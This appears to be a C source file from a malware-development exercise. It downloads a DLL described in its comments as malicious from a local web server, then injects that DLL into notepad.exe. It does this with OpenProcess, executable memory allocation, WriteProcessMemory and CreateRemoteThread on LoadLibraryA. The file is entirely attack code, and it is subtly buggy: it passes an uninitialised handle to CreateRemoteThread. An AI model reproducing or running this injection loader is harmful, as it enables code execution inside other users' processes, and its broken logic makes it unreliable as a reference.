#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <wininet.h>
#include "download.h"

#pragma comment (lib, "wininet.lib")

int getPIDbyProcName(const char* procName) {
	int pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hSnap, &pe32) != FALSE) {
		while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
			if (strcmp((const char*)pe32.szExeFile, procName) == 0) {
				pid = pe32.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnap);
	return (DWORD)pid;
}

int main(int argc, char* argv[]) {
	bool success = false;
	int pid = 0;
	HANDLE ph;
	const char evilDll[] = "C:\\Users\\localacc\\Desktop\\programming\\maldev_101\\malware_stagging";

	//Download malicious dll
	success = downloadFile("http://localhost:8080/hehe.dll", evilDll);
	if (!success) {
		printf("failed to download evil.dll");
		return 1;
	}

	// inject dll into process
	HMODULE hKernel32 = GetModuleHandle((LPCSTR)"Kernel32");
	VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
	pid = getPIDbyProcName("notepad.exe");
	int evillen = strlen(evilDll);
	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!procHandle) {
		printf("Failed to handle process");
		return 1;
	}
	LPVOID rb = VirtualAllocEx(procHandle, NULL, evillen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(procHandle, rb, evilDll, evillen, NULL);
	HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);
	return 0;

}